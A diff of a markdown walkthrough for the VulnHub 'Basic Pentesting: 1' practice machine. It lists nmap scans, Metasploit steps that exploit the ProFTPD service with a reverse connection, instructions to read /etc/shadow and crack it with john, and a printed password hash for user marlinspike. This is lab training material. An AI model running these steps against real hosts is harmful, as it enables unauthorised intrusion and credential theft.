@@ -73,20 +73,21 @@ Link to Challenge: [Basic Pentesting: 1 ~ VulnHub](<https://vulnhub.com/entry/ba
    - Target PC is usually under vendor 'PCS Systemtechnik GmbH'.
    - Note down the target PC's IP.
 3. Use nmap to find open ports on the target PC:
-   - `nmap <targetIP>`
-   - `nmap -sV <targetIP>`
-   - `nmap -sV -sC <targetIP>`
-   - `nmap -sV <targetIP> -vv`
+- `nmap <targetIP>`
+ - `nmap -sV <targetIP>`
+- `nmap -sV -sC <targetIP>`
+- `nmap -sV <targetIP> -vv`
 4. Check each port for vulnerabilities.
 5. Exploit the vulnerable FTP port using msfconsole:
    ```
-   bash
-   msfconsole
-   search proftpd
-   use 5
-   set RHOSTS <TARGET_IP>
-   set LHOST <your_ip>
-   exploit
+      bash
+      msfconsole
+      search proftpd
+      use 5
+      set RHOSTS <TARGET_IP>
+      set LHOST <your_ip>
+      exploit
+   ```
 6. You are basically inside the laptop now. However, if you still want to find the password, navigate to /etc/ and decrypt the shadow file using john.
 ```
 		==marlinspike:\$6\$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/==
